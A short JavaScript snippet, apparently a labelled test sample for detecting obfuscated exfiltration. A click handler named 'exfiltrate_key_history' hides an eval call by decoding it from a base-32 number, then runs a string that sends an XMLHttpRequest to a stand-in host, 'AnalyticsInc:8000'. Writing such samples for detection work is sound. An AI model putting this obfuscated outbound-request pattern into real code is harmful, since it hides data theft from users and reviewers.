function exfiltrate_key_history() {

    // Obfuscated and Nested Eval without obfuscated exp
    // Exfiltrate data using XMLHTTP request
    var exp='xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=eval3", true);xmlhttp.send(null);';
	eval(490837..toString(8<<2)+"")(exp);
	
}

document.getElementById('test').onclick = exfiltrate_key_history;
